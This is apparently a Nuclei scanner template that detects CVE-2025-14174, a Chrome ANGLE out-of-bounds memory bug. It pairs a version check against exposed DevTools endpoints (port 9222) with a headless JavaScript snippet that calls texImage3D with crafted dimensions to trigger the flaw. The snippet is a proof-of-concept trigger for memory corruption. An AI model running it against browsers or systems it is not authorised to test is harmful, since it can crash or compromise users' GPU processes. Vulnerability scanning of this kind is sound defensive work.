id: CVE-2025-14174

info:
  name: Google Chrome < 143.0.7499.110 - ANGLE Out-of-Bounds Read/Write
  author: princechaddha
  severity: high
  description: |
    Google Chrome versions prior to 143.0.7499.110 are vulnerable to an out-of-bounds memory access in the ANGLE graphics engine. The vulnerability exists within the Metal backend implementation due to improper validation of the pixelsDepthPitch parameter against the GL_UNPACK_IMAGE_HEIGHT value. This allows a remote attacker to perform out-of-bounds memory access via a specially crafted HTML page containing malicious WebGL content.
  impact: |
    Successful exploitation could allow an attacker to achieve out-of-bounds memory access, potentially leading to remote code execution (RCE) within the GPU process or information disclosure.
  remediation: |
    Update Google Chrome to version 143.0.7499.110 or later.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-14174
    - https://chromereleases.googleblog.com/2025/12/stable-channel-update-for-desktop.html
    - https://github.com/google/angle/commit/95a32cb37edbb90eac0b83727b38fedbbb32307b
    - https://thehackernews.com/2025/12/chrome-targeted-by-active-in-wild.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2025-14174
    cwe-id: CWE-125,CWE-787
  metadata:
    verified: true
    max-request: 1
    shodan-query: port:9222
  tags: cve,cve2025,chrome,angle,oob,headless,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/json/version"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Browser"
          - "User-Agent"
        condition: and

      - type: regex
        part: body
        regex:
          - "(?:Headless)?Chrome/([0-9.]+)"

      - type: dsl
        dsl:
          - "compare_versions(version, '< 143.0.7499.110')"

    extractors:
      - type: regex
        name: version
        group: 1
        regex:
          - "(?:Headless)?Chrome/([0-9.]+)"

# Enhanced detection via Headless for services rendering HTML
headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: script
        args:
          code: |
            (async () => {
              const canvas = document.createElement('canvas');
              const gl = canvas.getContext('webgl2');
              if (!gl) return { vulnerable: false, reason: "no webgl2" };
              
              const renderer = gl.getParameter(gl.RENDERER);
              if (!renderer.includes("ANGLE") || !renderer.includes("Metal")) {
                return { vulnerable: false, reason: "not angle metal" };
              }

              let contextLost = false;
              canvas.addEventListener('webglcontextlost', () => { contextLost = true; }, false);
              
              gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 1);
              const data = new Uint8Array(1024 * 1024 * 4);
              try {
                // Trigger condition: height (1024) > unpackHeight (1) with depth > 1
                gl.texImage3D(gl.TEXTURE_3D, 0, gl.RGBA8, 1, 1024, 2, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
              } catch (e) {}

              await new Promise(r => setTimeout(r, 200));
              return { vulnerable: contextLost || gl.isContextLost() };
            })()
        name: detection

    matchers:
      - type: dsl
        dsl:
          - "detection.vulnerable == true"
